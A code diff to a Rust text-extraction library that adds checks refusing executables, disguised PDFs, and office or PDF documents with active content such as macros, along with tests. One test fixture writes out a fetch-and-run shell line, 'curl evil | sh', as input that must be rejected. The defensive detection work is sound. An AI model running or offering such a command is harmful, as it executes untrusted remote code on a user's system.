@@ -9,6 +9,7 @@
 //! Text paragraphs are separated by a blank line, which is what change detection in `atena-core`
 //! compares.
 
+mod danger;
 mod decode;
 mod html;
 mod lang;
@@ -46,6 +47,19 @@ pub enum Format {
     Odt,
     /// Plain text.
     Text,
+}
+
+impl Format {
+    /// The media type of the format – recorded instead of whatever the server claimed.
+    pub fn media_type(self) -> &'static str {
+        match self {
+            Self::Html => "text/html",
+            Self::Pdf => "application/pdf",
+            Self::Docx => "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
+            Self::Odt => "application/vnd.oasis.opendocument.text",
+            Self::Text => "text/plain",
+        }
+    }
 }
 
 /// The content of a document.
@@ -101,6 +115,9 @@ pub enum ExtractError {
     /// A damaged DOCX or ODT.
     #[error("office document: {0}")]
     Office(String),
+    /// A program, a disguised file or a document with active content – refused as a whole.
+    #[error("dangerous file: {0}")]
+    Dangerous(String),
 }
 
 fn tdm_value(value: Option<&str>) -> Option<bool> {
@@ -126,16 +143,26 @@ fn format_of(
     content_type: Option<&str>,
 ) -> Result<(Format, Option<office::OfficeFormat>), ExtractError> {
     let head = &body[..body.len().min(1024)];
-    if head.windows(5).any(|w| w == b"%PDF-") {
+    let dangerous = |what: &str| Err(ExtractError::Dangerous(what.to_string()));
+    if let Some(program) = danger::executable(body) {
+        return dangerous(program);
+    }
+    if danger::is_pdf(body) {
         return Ok((Format::Pdf, None));
+    }
+    if danger::disguised_pdf(head) {
+        return dangerous("a PDF signature hidden behind other data");
     }
     if body.starts_with(b"PK\x03\x04") {
         return match office::detect(body) {
-            Some(office::OfficeFormat::Docx) => {
+            Ok(Some(office::OfficeFormat::Docx)) => {
                 Ok((Format::Docx, Some(office::OfficeFormat::Docx)))
             }
-            Some(office::OfficeFormat::Odt) => Ok((Format::Odt, Some(office::OfficeFormat::Odt))),
-            None => Err(ExtractError::Unsupported("ZIP archive".into())),
+            Ok(Some(office::OfficeFormat::Odt)) => {
+                Ok((Format::Odt, Some(office::OfficeFormat::Odt)))
+            }
+            Ok(None) => Err(ExtractError::Unsupported("ZIP archive".into())),
+            Err(active) => dangerous(&format!("an office document with {active}")),
         };
     }
     let lower = String::from_utf8_lossy(head).to_ascii_lowercase();
@@ -292,7 +319,12 @@ pub fn extract(
             plain_text(&text)
         }
         Format::Pdf => {
-            let p = pdf::extract_pdf(body).map_err(ExtractError::Pdf)?;
+            let p = pdf::extract_pdf(body).map_err(|e| match e {
+                pdf::PdfError::Broken(why) => ExtractError::Pdf(why),
+                pdf::PdfError::Dangerous(active) => {
+                    ExtractError::Dangerous(format!("a PDF with {active}"))
+                }
+            })?;
             doc.title = p.title;
             doc.authors = p.authors;
             doc.published = p.published;
@@ -357,9 +389,38 @@ mod tests {
     #[test]
     fn binary_data_declared_as_text_is_refused() {
         assert!(matches!(
-            extract(b"MZ\x90\0\x03\0\0\0", Some("text/plain"), &url()),
+            extract(b"\x00\x01\x02 data", Some("text/plain"), &url()),
             Err(ExtractError::Unsupported(_))
         ));
+    }
+
+    #[test]
+    fn programs_and_active_documents_are_refused_whatever_they_are_called() {
+        for (body, declared) in [
+            (&b"MZ\x90\0\x03\0\0\0"[..], "text/plain"),
+            (b"MZ\x90\0\x03%PDF-1.7", "application/pdf"),
+            (b"\x7fELF\x02\x01", "text/html"),
+            (b"#!/bin/sh\ncurl evil | sh", "text/plain"),
+            (b"\x00\x01junk%PDF-1.4 rest", "application/pdf"),
+        ] {
+            assert!(
+                matches!(
+                    extract(body, Some(declared), &url()),
+                    Err(ExtractError::Dangerous(_))
+                ),
+                "{declared}"
+            );
+        }
+        let with_macros = office::tests::zip_of(&[
+            ("word/document.xml", office::tests::DOCX_BODY),
+            ("word/vbaProject.bin", "Attribute VB_Name"),
+        ]);
+        assert_eq!(
+            extract(&with_macros, None, &url()),
+            Err(ExtractError::Dangerous(
+                "an office document with macros".into()
+            ))
+        );
     }
 
     #[test]
